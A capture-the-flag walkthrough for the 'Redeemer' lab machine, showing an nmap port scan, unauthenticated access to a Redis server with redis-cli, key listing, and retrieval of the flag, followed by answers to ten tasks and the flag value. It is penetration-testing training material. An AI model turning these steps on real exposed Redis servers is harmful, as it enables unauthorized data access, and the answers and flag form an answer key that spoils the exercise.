Starting Point - Tier 0

-Machine Name: Redeemer

-Difficulty: Very Easy

-IP address: 10.129.2.230



##      Steps:

- scan the network

      sudo nmap 10.129.2.230 -sV -p- --min-rate 5000

- go to root

      sudo su
- to see redis commands

      redis-cli --help
- connect to redis server

      redis-cli -h 10.129.2.230

- select database 0

      select 0

- list the information of the redis

      info
-  list all the keys stored in the currently selected database.

        keys *
- download flag

      get flag

- in the root, go to Downloads

      cd Downloads

- open the file containing the flag

      cat flag.txt


##  Tasks:

Task 1

-Which TCP port is open on the machine?


    6379


Task 2

-Which service is running on the port that is open on the machine?


    redis


Task 3

-What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database


    In-memory Database


Task 4

-Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.


    redis-cli


Task 5

-Which flag is used with the Redis command-line utility to specify the hostname?


    -h


Task 6

-Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?


    info


Task 7

-What is the version of the Redis server being used on the target machine?


    5.0.7


Task 8

-Which command is used to select the desired database in Redis?


    select


Task 9

-How many keys are present inside the database with index 0?


    4


Task 10

-Which command is used to obtain all the keys in a database?


    keys *


Submit Flag

-Submit root flag


    03e1d2b376c37ab3f5319922053953eb
